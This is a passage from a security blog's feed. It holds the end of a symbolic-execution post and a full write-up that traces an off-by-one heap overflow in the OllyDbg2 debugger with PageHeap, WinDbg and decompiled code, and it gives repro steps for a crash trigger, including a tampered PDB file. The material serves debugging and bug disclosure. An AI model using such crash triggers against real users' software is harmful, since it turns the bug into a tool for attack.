</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;CPU state at the end:&#39;</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">sym</span><span class="o">.</span><span class="n">ctx</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Retrieving and simplifying the EAX register..&#39;</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">sym</span><span class="o">.</span><span class="n">get_reg_equation_simplified</span><span class="p">(</span><span class="s">&#39;eax&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;EAX=</span><span class="si">%r</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">eax</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And here is the final output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>Launching the engine..
</span><span class='line'>Trying to read a non-initialized area, we got a new symbolic variable: arg0
</span><span class='line'>Trying to read a non-initialized area, we got a new symbolic variable: arg1
</span><span class='line'>5000 instructions, 2263 equations so far...
</span><span class='line'>10000 instructions, 4832 equations so far...
</span><span class='line'>15000 instructions, 7228 equations so far...
</span><span class='line'>20000 instructions, 9766 equations so far...
</span><span class='line'>25000 instructions, 12212 equations so far...
</span><span class='line'>30000 instructions, 14762 equations so far...
</span><span class='line'>35000 instructions, 17255 equations so far...
</span><span class='line'>40000 instructions, 19801 equations so far...
</span><span class='line'>Done. 19857 equations built, 40130 assembly lines emulated, 5970 virtual memory cells used
</span><span class='line'>CPU state at the end:
</span><span class='line'>{&#39;eax&#39;: EID:19856, &#39;ebp&#39;: None, &#39;eip&#39;: None, &#39;esp&#39;: None, &#39;edx&#39;: EID:19825, &#39;edi&#39;: EID:19796, &#39;ebx&#39;: EID:19797, &#39;esi&#39;: EID:19823, &#39;ecx&#39;: EID:19856}
</span><span class='line'>Retrieving and simplifying the EAX register..
</span><span class='line'>EAX=arg0 + arg1
</span></code></pre></td></tr></table></div></figure>


<h1>Conclusion</h1>

<p>I hope you did enjoy this little introduction to symbolic execution, and how it can be very valuable to remove some semantic-preserving obfuscations. We also have seen that this PoC is not really elaborate: it doesn&rsquo;t handle loops or any branches, doesn&rsquo;t care about EFLAGS, etc ; but it was enough to break our two examples. I hope you also enjoyed the examples used to showcase our tiny symbolic execution engine.</p>

<p>If you want to go further with symbolic execution, here is a list of nice articles:</p>

<ul>
<li><a href="http://seanhn.wordpress.com/2012/03/23/anatomy-of-a-symbolic-emulator-part-1-trace-generation/">Anatomy of a Symbolic Emulator, Part 1: Trace Generation</a></li>
<li><a href="http://seanhn.wordpress.com/2012/03/23/anatomy-of-a-symbolic-emulator-part-2-introducing-symbolic-data/">Anatomy of a Symbolic Emulator, Part 2: Introducing Symbolic Data</a></li>
<li><a href="http://seanhn.wordpress.com/2012/03/23/anatomy-of-a-symbolic-emulator-part-3-processing-symbolic-data-generating-new-inputs/">Anatomy of a Symbolic Emulator, Part 3: Processing Symbolic Data &amp; Generating New Inputs</a></li>
<li><a href="http://research.microsoft.com/en-us/um/people/pg/public_psfiles/fsttcs2012.pdf">Test Generation Using Symbolic Execution</a></li>
<li><a href="http://ccadar.github.io/klee/">The KLEE Symbolic Virtual Machine</a></li>
<li><a href="http://shell-storm.org/blog/Concolic-execution-taint-analysis-with-valgrind-and-constraints-path-solver-with-z3/">Concolic execution &ndash; Taint analysis with Valgrind and constraints path solver with Z3</a></li>
<li><a href="https://sites.google.com/site/symexbib/">A Bibliography of Papers on Symbolic Execution Technique and its Applications</a></li>
</ul>


<p>PS: By the way, for those who like weird machines, I&rsquo;ve managed to code a MOV/JMP turing machine based on <a href="http://www.cl.cam.ac.uk/~sd601/papers/mov.pdf">mov is Turing-complete</a> here: <a href="https://github.com/0vercl0k/stuffz/blob/master/fun_with_mov_turing_completeness.cpp">fun_with_mov_turing_completeness.cpp</a>!</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Pinpointing heap-related issues: OllyDbg2 off-by-one story]]></title>
    <link href="http://doar-e.github.io/blog/2013/09/09/pinpointing-heap-related-issues-ollydbg2-off-by-one-story/"/>
    
    <updated>2013-09-09T09:53:00+01:00</updated>
    <id>http://doar-e.github.io/blog/2013/09/09/pinpointing-heap-related-issues-ollydbg2-off-by-one-story</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>Yesterday afternoon, I was peacefully coding some stuff you know but I couldn&rsquo;t make my code working.
As usual, in those type of situations you fire up your debugger in order to understand what is going on under the hood.
That was a bit weird, to give you a bit of context I was doing some inline x86 assembly, and I&rsquo;ve put on purpose an <em>int3</em> just
before the piece of assembly code I thought was buggy. Once my file loaded in <a href="http://ollydbg.de/version2.html">OllyDbg2</a>, I hit <em>F9</em> in order to reach quickly the <em>int3</em> I&rsquo;ve slipped into the inline assembly code. A bit of single-stepping, and <strong>BOOM</strong> I got a nasty crash. It happens sometimes, and that&rsquo;s uncool.
Then, I relaunch my binary and try to reproduce the bug: same actions and <strong>BOOM</strong> again. OK, this time it&rsquo;s cool, I got a reproducible crash in OllyDbg2.</p>

<p>I like when things like that happens to me (remember the crashes I&rsquo;ve found in OllyDbg/IDA here: <a href="http://download.tuxfamily.org/overclokblog/PDB%20ain%27t%20PDD/0vercl0k_pdb_aint_pdd.pdf">PDB Ain&rsquo;t PDD</a>), it&rsquo;s always a nice exercise for me where I&rsquo;ve to:</p>

<ul>
<li>pinpoint the bug in the application: usually not trivial when it&rsquo;s a real/big application</li>
<li>reverse-engineer the codes involved in the bug in order to figure out why it&rsquo;s happening (sometimes I got the sources, sometimes I don&rsquo;t like this time)</li>
</ul>


<p>In this post, I will show you how I&rsquo;ve manage to pinpoint where the bug was, using <a href="http://msdn.microsoft.com/en-us/library/windows/hardware/ff549561(v=vs.85).aspx">GFlags, PageHeap</a> and <a href="http://www.windbg.info/">WinDbg</a>. Then, we will reverse-engineer the buggy code in order to understand why the bug is happening, and how we can code a clean trigger.</p>

<!--more-->


<h1>The crash</h1>

<p>The first thing I did was to launch WinDbg to debug OllyDbg2 to debug my binary (yeah.). Once OllyDbg2 has been started up, I reproduced exactly the same steps as previously to trigger the bug and here is what WinDbg was telling me:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>HEAP[ollydbg.exe]: Heap block at 00987AB0 modified at 00987D88 past
</span><span class='line'>requested size of 2d0
</span><span class='line'>
</span><span class='line'>(a60.12ac): Break instruction exception - code 80000003 (first chance)
</span><span class='line'>eax=00987ab0 ebx=00987d88 ecx=76f30b42 edx=001898a5 esi=00987ab0 edi=000002d0
</span><span class='line'>eip=76f90574 esp=00189aec ebp=00189aec iopl=0         nv up ei pl nz na po nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
</span><span class='line'>ntdll!RtlpBreakPointHeap+0x23:
</span><span class='line'>76f90574 cc              int     3
</span></code></pre></td></tr></table></div></figure>


<p>We got a debug message from the heap allocator informing us the process has written outside of its heap buffer. The thing is, this message and the breakpoint are not triggered when the faulty write is done but triggered like <em>after</em>, when another call to the allocator has been made. At this moment, the allocator is checking the chunks are OK and if it sees something weird, it outputs a message and breaks. The stack-trace should confirm that:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; k
</span><span class='line'>ChildEBP RetAddr
</span><span class='line'>00189aec 76f757c2 ntdll!RtlpBreakPointHeap+0x23
</span><span class='line'>00189b04 76f52a8a ntdll!RtlpCheckBusyBlockTail+0x171
</span><span class='line'>00189b24 76f915cf ntdll!RtlpValidateHeapEntry+0x116
</span><span class='line'>00189b6c 76f4ac29 ntdll!RtlDebugFreeHeap+0x9a
</span><span class='line'>00189c60 76ef34a2 ntdll!RtlpFreeHeap+0x5d
</span><span class='line'>00189c80 75d8537d ntdll!RtlFreeHeap+0x142
</span><span class='line'>00189cc8 00403cfc KERNELBASE!GlobalFree+0x27
</span><span class='line'>00189cd4 004cefc0 ollydbg!Memfree+0x3c
</span><span class='line'>...
</span></code></pre></td></tr></table></div></figure>


<p>As we said just above, the message from the heap allocator has been probably triggered when OllyDbg2 wanted to free a chunk of memory.</p>

<p>Basically, the problem with our issue is the fact we don&rsquo;t know:</p>

<ul>
<li>where the heap chunk has been allocated</li>
<li>where the faulty write has been made</li>
</ul>


<p>That&rsquo;s what makes our bug not trivial to debug without the suitable tools. If you want to have more information about debugging heap issues efficiently, you should definitely read the heap chapter in <a href="http://advancedwindowsdebugging.com/">Advanced Windows Debugging</a> (cheers <a href="https://twitter.com/Ivanlef0u">`Ivan</a>).</p>

<h1>Pinpointing the heap issue: introducing full PageHeap</h1>

<p>In a nutshell, the full PageHeap option is really powerful to diagnostic heap issues, here are at least two reasons why:</p>

<ul>
<li>it will save where each heap chunk has been allocated</li>
<li>it will allocate a guard page at the end of our chunk (thus when the faulty write occurs, we might have a write access exception)</li>
</ul>


<p>To do so, this option changes a bit how the allocator works (it adds more meta-data for each heap chunk, etc.) ; if you want more information, try at home allocating stuff with/without page heap and compare the allocated memory. Here is how looks like a heap chunk when PageHeap full is enabled:</p>

<p><img class="center" src="http://doar-e.github.io/images/pinpointing_heap_related_issues__ollydbg2_off_by_one_story/heapchunk.gif"></p>

<p>To enable it for <em>ollydbg.exe</em>, it&rsquo;s trivial. We just launch the <em>gflags.exe</em> binary (it&rsquo;s in Windbg&rsquo;s directory) and you tick the features you want to enable.</p>

<p><img class="center" src="http://doar-e.github.io/images/pinpointing_heap_related_issues__ollydbg2_off_by_one_story/gflags.png"></p>

<p>Now, you just have to relaunch your target in WinDbg, reproduce the bug and here is what I get now:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>(f48.1140): Access violation - code c0000005 (first chance)
</span><span class='line'>First chance exceptions are reported before any exception handling.
</span><span class='line'>This exception may be expected and handled.
</span><span class='line'>
</span><span class='line'>eax=000000b4 ebx=0f919abc ecx=0f00ed30 edx=00000b73 esi=00188694 edi=005d203c
</span><span class='line'>eip=004ce769 esp=00187d60 ebp=00187d80 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
</span><span class='line'>ollydbg!Findfreehardbreakslot+0x21d9:
</span><span class='line'>004ce769 891481          mov     dword ptr [ecx+eax*4],edx ds:002b:0f00f000=????????
</span></code></pre></td></tr></table></div></figure>


<p>Woot, this is very cool, because now we know <strong>exactly</strong> where something is going wrong. Let&rsquo;s get more information about the heap chunk now:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; !heap -p -a ecx
</span><span class='line'>    address 0f00ed30 found in
</span><span class='line'>    _DPH_HEAP_ROOT @ 4f11000
</span><span class='line'>    in busy allocation
</span><span class='line'>    (  DPH_HEAP_BLOCK:  UserAddr  UserSize -  VirtAddr VirtSize)
</span><span class='line'>              f6f1b2c:  f00ed30        2d0 -  f00e000  2000
</span><span class='line'>
</span><span class='line'>    6e858e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
</span><span class='line'>    76f90d96 ntdll!RtlDebugAllocateHeap+0x00000030
</span><span class='line'>    76f4af0d ntdll!RtlpAllocateHeap+0x000000c4
</span><span class='line'>    76ef3cfe ntdll!RtlAllocateHeap+0x0000023a
</span><span class='line'>    75d84e55 KERNELBASE!GlobalAlloc+0x0000006e
</span><span class='line'>    00403bef ollydbg!Memalloc+0x00000033
</span><span class='line'>    004ce5ec ollydbg!Findfreehardbreakslot+0x0000205c
</span><span class='line'>    004cf1df ollydbg!Getsourceline+0x0000007f
</span><span class='line'>    00479e1b ollydbg!Getactivetab+0x0000241b
</span><span class='line'>    0047b341 ollydbg!Setcpu+0x000006e1
</span><span class='line'>    004570f4 ollydbg!Checkfordebugevent+0x00003f38
</span><span class='line'>    0040fc51 ollydbg!Setstatus+0x00006441
</span><span class='line'>    004ef9ef ollydbg!Pluginshowoptions+0x0001214f
</span></code></pre></td></tr></table></div></figure>


<p>With this really handy command we got a lot of relevant information:</p>

<ul>
<li>This chunk has a size of 0x2d0 bytes. Thus, starting from 0xf00ed30 to 0xf00efff.</li>
<li>The faulty write now makes sense: the application tries to write 4 bytes outside of its heap buffer (off-by-one on an unsigned array I guess).</li>
<li>The memory has been allocated in <em>ollydbg!Memalloc</em> (called by <em>ollydbg!Getsourceline</em>, PDB related ?). We will study that routine later in the post.</li>
<li>The faulty write occurs at address 0x4ce769.</li>
</ul>


<h1>Looking inside OllyDbg2</h1>

<p>We are kind of lucky, the routines involved with this bug are quite simple to reverse-engineer, and Hexrays works just like a charm. Here is the C code (the interesting part at least) of the buggy function:</p>

<figure class='code'><figcaption><span>ollydbg!buggy @ 0x004CE424</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">signed</span> <span class="kt">int</span> <span class="nf">buggy</span><span class="p">(</span><span class="n">struct_a1</span> <span class="o">*</span><span class="n">u</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">file_size</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">nbchar</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">file_content</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">nb_lines</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// ...</span>
</span><span class='line'>  <span class="n">file_content</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)</span><span class="n">Readfile</span><span class="p">(</span><span class="o">&amp;</span><span class="n">u</span><span class="o">-&gt;</span><span class="n">sourcefile</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">file_size</span><span class="p">);</span>
</span><span class='line'>  <span class="c1">// ...</span>
</span><span class='line'>  <span class="n">nbchar</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">nb_lines</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="n">nbchar</span> <span class="o">&lt;</span> <span class="n">file_size</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="c1">// doing stuff to count all the char, and all the lines in the file</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem1_ov</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">Memalloc</span><span class="p">(</span><span class="mi">12</span> <span class="o">*</span> <span class="p">(</span><span class="n">nb_lines</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">3</span><span class="p">);</span>
</span><span class='line'>  <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem2</span> <span class="o">=</span> <span class="n">Memalloc</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="p">(</span><span class="n">nb_lines</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">3</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem1_ov</span> <span class="o">&amp;&amp;</span> <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem2</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">nbchar</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">nb_lines2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">while</span> <span class="p">(</span> <span class="n">nbchar</span> <span class="o">&lt;</span> <span class="n">file_size</span> <span class="o">&amp;&amp;</span> <span class="n">file_content</span><span class="p">[</span><span class="n">nbchar</span><span class="p">]</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem1_ov</span><span class="p">[</span><span class="mi">3</span> <span class="o">*</span> <span class="n">nb_lines2</span><span class="p">]</span> <span class="o">=</span> <span class="n">nbchar</span><span class="p">;</span>
</span><span class='line'>      <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem1_ov</span><span class="p">[</span><span class="mi">3</span> <span class="o">*</span> <span class="n">nb_lines2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span> <span class="n">nbchar</span> <span class="o">&lt;</span> <span class="n">file_size</span> <span class="p">)</span>
</span><span class='line'>      <span class="p">{</span>
</span><span class='line'>        <span class="k">while</span> <span class="p">(</span> <span class="n">file_content</span><span class="p">[</span><span class="n">nbchar</span><span class="p">]</span> <span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="c1">// Consume a line, increment stuff until finding a &#39;\r&#39; or &#39;\n&#39; sequence</span>
</span><span class='line'>            <span class="c1">// ..</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="o">++</span><span class="n">nb_lines2</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">// BOOM!</span>
</span><span class='line'>    <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem1_ov</span><span class="p">[</span><span class="mi">3</span> <span class="o">*</span> <span class="n">nb_lines2</span><span class="p">]</span> <span class="o">=</span> <span class="n">nbchar</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, let me explain what this routine does:</p>

<ul>
<li>This routine is called by OllyDbg2 when it finds a PDB database for your binary and, more precisely, when in this database it finds the path of your application&rsquo;s source codes. It&rsquo;s useful to have those kind of information when you are debugging, OllyDbg2 is able to tell you at which line of your C code you&rsquo;re currently at.</li>
</ul>


<p><img class="center" src="http://doar-e.github.io/images/pinpointing_heap_related_issues__ollydbg2_off_by_one_story/source.png"></p>

<ul>
<li>At line 10: &ldquo;u->Sourcefile&rdquo; is a string pointer on the path of your source code (found in the PDB database). The routine is just reading the whole file, giving you its size, and a pointer on the file content now stored memory.</li>
<li>From line 12 to 18: we have a loop counting the total number of lines in your source code.</li>
<li>At line 20: we have the allocation of our chunk. It allocates 12*(nb_lines + 1) bytes. We saw previously in WinDbg that the size of the chunk was 0x2d0: it should means we have exactly ((0x2d0 / 12) &ndash; 1) = 59 lines in our source code:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>D:\TODO\crashes\odb2-OOB-write-heap&gt;wc -l OOB-write-heap-OllyDbg2h-trigger.c
</span><span class='line'>59 OOB-write-heap-OllyDbg2h-trigger.c
</span></code></pre></td></tr></table></div></figure>


<p>Good.</p>

<ul>
<li>From line 24 to 39: we have a loop similar to previous one. It&rsquo;s basically counting lines again and initializing the memory we just allocated with some information.</li>
<li>At line 41: we have our bug. Somehow, we can manage to get out of the loop with &ldquo;nb_lines2 = nb_lines + 1&rdquo;. That means the line 41 will try to write one cell outside of our buffer. In our case, if we have &ldquo;nb_lines2 = 60&rdquo; and our heap buffer starting at 0xf00ed30, it means we&rsquo;re going to try to write at (0xf00ed30+60<em>3</em>4)=0xf00f000. That&rsquo;s exactly what we saw earlier.</li>
</ul>


<p>At this point, we have fully explained the bug. If you want to do some dynamic analysis in order to follow important routines, I&rsquo;ve made several breakpoints, here they are:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>bp 004CF1BF &quot;.printf \&quot;[Getsourceline] %mu\\n[Getsourceline] struct: 0x%x\&quot;, poi(esp + 4), eax ; .if(eax != 0){ .if(poi(eax + 0x218) == 0){ .printf \&quot; field: 0x%x\\n\&quot;, poi(eax + 0x218); gc }; } .else { .printf \&quot;\\n\\n\&quot; ; gc; };&quot;
</span><span class='line'>bp 004CE5DD &quot;.printf \&quot;[buggy] Nbline: 0x%x \\n\&quot;, eax ; gc&quot;
</span><span class='line'>bp 004CE5E7 &quot;.printf \&quot;[buggy] Nbbytes to alloc: 0x%x \\n\&quot;, poi(esp) ; gc&quot;
</span><span class='line'>bp 004CE742 &quot;.printf \&quot;[buggy] NbChar: 0x%x / 0x%x - Idx: 0x%x\\n\&quot;, eax, poi(ebp - 1C), poi(ebp - 8) ; gc&quot;
</span><span class='line'>bp 004CE769 &quot;.printf \&quot;[buggy] mov [0x%x + 0x%x], 0x%x\\n\&quot;, ecx, eax * 4, edx&quot;
</span></code></pre></td></tr></table></div></figure>


<p>On my environment, it gives me something like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>[Getsourceline] f:\dd\vctools\crt_bld\self_x86\crt\src\crt0.c
</span><span class='line'>[Getsourceline] struct: 0x0
</span><span class='line'>[...]
</span><span class='line'>[Getsourceline] oob-write-heap-ollydbg2h-trigger.c
</span><span class='line'>[Getsourceline] struct: 0xaf00238 field: 0x0
</span><span class='line'>[buggy] Nbline: 0x3b
</span><span class='line'>[buggy] Nbbytes to alloc: 0x2d0
</span><span class='line'>[buggy] NbChar: 0x0 / 0xb73 - Idx: 0x0
</span><span class='line'>[buggy] NbChar: 0x4 / 0xb73 - Idx: 0x1
</span><span class='line'>[buggy] NbChar: 0x5a / 0xb73 - Idx: 0x2
</span><span class='line'>[buggy] NbChar: 0xa4 / 0xb73 - Idx: 0x3
</span><span class='line'>[buggy] NbChar: 0xee / 0xb73 - Idx: 0x4
</span><span class='line'>[...]
</span><span class='line'>[buggy] NbChar: 0xb73 / 0xb73 - Idx: 0x3c
</span><span class='line'>[buggy] mov [0xb031d30 + 0x2d0], 0xb73
</span><span class='line'>
</span><span class='line'>eax=000000b4 ebx=12dfed04 ecx=0b031d30 edx=00000b73 esi=00188694 edi=005d203c
</span><span class='line'>eip=004ce769 esp=00187d60 ebp=00187d80 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>ollydbg!Findfreehardbreakslot+0x21d9:
</span><span class='line'>004ce769 891481          mov     dword ptr [ecx+eax*4],edx ds:002b:0b032000=????????
</span></code></pre></td></tr></table></div></figure>


<h1>Repro@home</h1>

<ol>
<li>Download the last version of OllyDbg2 <a href="http://ollydbg.de/odbg201h.zip">here</a>, extract the files</li>
<li>Download the three files from <a href="https://github.com/0vercl0k/stuffz/tree/master/odb2-OOB-write-heap">odb2-oob-write-heap</a>, put them in the same directory than <em>ollydbg.exe</em> is</li>
<li>Launch WinDbg and open the last version of OllyDbg2</li>
<li>Set your breakpoints (or not), F5 to launch</li>
<li>Open the trigger in OllyDbg2</li>
<li>Press F9 when the binary is fully loaded</li>
<li><strong>BOOM</strong> :). Note that you may not have a visible crash (remember, that&rsquo;s what made our bug not trivial to debug without full pageheap). Try to poke around with the debugger: restarting the binary or closing OllyDbg2 should be enough to get the message from the heap allocator in your debugger.</li>
</ol>


<p><img class="center" src="http://doar-e.github.io/images/pinpointing_heap_related_issues__ollydbg2_off_by_one_story/woot.png"></p>

<h1>Fun fact</h1>

<p>You can even trigger the bug with only the binary and the PDB database. The trick is to tamper the PDB, and more precisely where it keeps the path to your source code. That way, when OllyDbg2 will load the PDB database, it will read that same database like it&rsquo;s the source code of the application. Awesome.</p>

<p><img class="center" src="http://doar-e.github.io/images/pinpointing_heap_related_issues__ollydbg2_off_by_one_story/fun.png"></p>

<h1>Conclusion</h1>

<p>Those kind of crashes are always an occasion to learn new things. Either it&rsquo;s trivial to debug/repro and you won&rsquo;t waste much of your time, or it&rsquo;s not and you will improve your debugger/reverse-engineer-fu on a <strong>real</strong> example. So do it!</p>

<p>By the way, I doubt the bug is exploitable and I didn&rsquo;t even try to exploit it ; but if you succeed I would be really glad to read your write-up! But if we assume it&rsquo;s exploitable for a second, you would still have to distribute the PDB file, the source file (I guess it would give you more control than with the PDB) and the binary to your victim. So no big deal.</p>

<p>If you are too lazy to debug your crashes, send them to me, I may have a look at it!</p>

<p>Oh, I almost forgot: <a href="http://doar-e.github.io/about/">we are still looking for motivated contributors to write cool posts</a>, spread the world.</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Some thoughts about code-coverage measurement with Pin]]></title>
    <link href="http://doar-e.github.io/blog/2013/08/31/some-thoughts-about-code-coverage-measurement-with-pin/"/>
